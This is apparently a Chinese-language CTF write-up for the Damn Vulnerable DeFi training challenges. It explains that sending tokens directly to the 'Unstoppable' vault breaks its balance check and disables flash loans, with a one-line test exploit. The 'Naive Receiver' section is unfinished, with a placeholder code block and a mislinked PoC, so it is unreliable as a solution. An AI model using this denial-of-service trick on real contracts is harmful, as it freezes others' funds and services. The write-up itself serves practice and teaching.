## Damn Vulnerable DeFi Writeup [SunSec]

### Unstoppable

題目: 
有一個代幣化的金庫，存入了100萬個DVT代幣。該金庫提供免費的閃電貸款，直到寬限期結束。為了在完全無需許可前捕捉任何錯誤，開發者決定在測試網中進行實時測試。還有一個監控合約，用來檢查閃電貸款功能的運行狀況。從餘額為10個DVT代幣開始，展示如何使金庫停止運行。必須讓它停止提供閃電貸款。

過關條件:
- 讓 flashLoan 功能失效

解題:
只要 transfer token 給這個合約就可以讓 totalSupply != balanceBefore 讓閃電貸款失效。

```
 if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); 
```

[POC:](./Writeup/SunSec/damn-vulnerable-defi/test/unstoppable/Unstoppable.t.sol) 
```
    function test_unstoppable() public checkSolvedByPlayer {
        token.transfer(address(vault), 123);   
    }
```



### Naive Receiver

題目: 
有一個資金池，餘額為1000 WETH，並提供閃電貸款。它收取固定費用為1 WETH。該資金池通過整合無需許可的轉發合約，支持元交易。一名使用者部署了一個餘額為10 WETH的範例合約。看起來它可以執行WETH的閃電貸款。所有資金都面臨風險！將使用者和資金池中的所有WETH救出，並將其存入指定的recovery賬戶。

過關條件:
- 必須執行兩次或更少的交易。確保 vm.getNonce(player) 小於等於2。

- 確保 weth.balanceOf(address(receiver)) 為 0。

- 確保 weth.balanceOf(address(pool)) 為 0。

- 確保 weth.balanceOf(recovery) 等於 WETH_IN_POOL + WETH_IN_RECEIVER = 1010 ETH。

解題:
NaiveReceiverPool 繼承 Multicall, IERC3156FlashLender 

[ERC-3156](https://eips.ethereum.org/EIPS/eip-3156): 閃電貸模組和允許閃電貸的 {ERC20} 擴充。

FlashLoanReceiver 每次接收的 Flashloan 會支付1ETH手續費給 Pool.

晚點繼續
```
xxx
```

[POC:](./Writeup/SunSec/damn-vulnerable-defi/test/unstoppable/Unstoppable.t.sol) 